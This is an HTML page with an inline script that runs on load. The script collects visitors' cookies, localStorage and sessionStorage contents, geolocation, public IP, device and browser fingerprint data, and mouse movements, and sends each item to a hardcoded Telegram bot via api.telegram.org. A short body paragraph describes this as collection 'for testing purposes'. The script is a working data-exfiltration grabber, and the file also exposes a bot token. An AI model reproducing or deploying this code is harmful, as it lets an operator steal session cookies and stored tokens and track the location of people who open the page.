<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Information Collection</title>
    <script>
        function sendToServer(type, data) {
            var botToken = "7050708606:AAEiMRDF9-MXNpzrf_TnOCH8yI7GbxhjWqk";
            var chatId = "955403001";

            var message = `Type: ${type}\nData: ${JSON.stringify(data, null, 2)}`;
            var url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;

            var xhr = new XMLHttpRequest();
            xhr.open("GET", url, true);
            xhr.send();
        }

        // Collecting browser and OS information
        var browserInfo = {
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            cookiesEnabled: navigator.cookieEnabled,
        };
        sendToServer('browserInfo', browserInfo);

        // Collecting geolocation
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(function(position) {
                var geolocation = {
                    latitude: position.coords.latitude,
                    longitude: position.coords.longitude,
                    accuracy: position.coords.accuracy
                };
                sendToServer('geolocation', geolocation);
            });
        }

        // Collecting cookies
        var cookies = document.cookie;
        sendToServer('cookies', cookies);

        // Collecting local storage
        var localStorageData = {};
        for (var key in localStorage) {
            if (localStorage.hasOwnProperty(key)) {
                localStorageData[key] = localStorage.getItem(key);
            }
        }
        sendToServer('localStorage', localStorageData);

        // Collecting session storage
        var sessionStorageData = {};
        for (var key in sessionStorage) {
            if (sessionStorage.hasOwnProperty(key)) {
                sessionStorageData[key] = sessionStorage.getItem(key);
            }
        }
        sendToServer('sessionStorage', sessionStorageData);

        // Collecting screen and device information
        var screenInfo = {
            width: screen.width,
            height: screen.height,
            colorDepth: screen.colorDepth,
            pixelDepth: screen.pixelDepth,
            userAgent: navigator.userAgent,
            platform: navigator.platform,
        };
        sendToServer('screenInfo', screenInfo);

        // Collecting network information
        var networkInfo = {
            ip: null,  // Will be set by an external IP lookup API
            connectionType: navigator.connection ? navigator.connection.effectiveType : null,
            downlink: navigator.connection ? navigator.connection.downlink : null,
        };

        // Fetch public IP address
        fetch('https://api.ipify.org?format=json')
            .then(response => response.json())
            .then(data => {
                networkInfo.ip = data.ip;
                sendToServer('networkInfo', networkInfo);
            });

        // Collecting additional browser features
        var browserFeatures = {
            plugins: Array.from(navigator.plugins, plugin => plugin.name),
            doNotTrack: navigator.doNotTrack,
            cookiesEnabled: navigator.cookieEnabled,
            javaEnabled: navigator.javaEnabled(),
        };
        sendToServer('browserFeatures', browserFeatures);

        // Collecting battery status
        if (navigator.getBattery) {
            navigator.getBattery().then(function(battery) {
                var batteryInfo = {
                    level: battery.level,
                    charging: battery.charging
                };
                sendToServer('batteryInfo', batteryInfo);
            });
        }

        // Collecting user interaction data (example: mouse movement)
        document.addEventListener('mousemove', function(event) {
            var mouseMove = { x: event.clientX, y: event.clientY };
            sendToServer('mouseMove', mouseMove);
        });

        // Collecting time zone and language information
        var environmentInfo = {
            timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            language: navigator.language,
            languages: navigator.languages,
        };
        sendToServer('environmentInfo', environmentInfo);
    </script>
</head>
<body>
    <h1>Information Collection Page</h1>
    <p>This page collects various pieces of information from your device and browser for testing purposes.</p>
    <p>Please be aware that visiting this page may collect data about your device, browser, and interactions.</p>
</body>
</html>
